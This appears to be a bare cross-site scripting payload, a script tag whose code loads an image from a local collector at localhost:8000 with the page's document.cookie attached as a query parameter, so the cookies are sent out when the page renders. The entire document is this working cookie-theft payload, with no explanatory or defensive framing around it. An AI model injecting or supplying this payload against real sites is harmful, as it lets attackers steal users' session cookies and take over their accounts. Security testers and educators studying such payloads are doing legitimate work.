<script type="text/javascript">
    var img = new Image();
    var div = document.getElementById('page-top');

    img.onload = function() {
    div.appendChild(img);
    };

    img.src = 'http://localhost:8000/?cookie_data='+document.cookie;;
</script>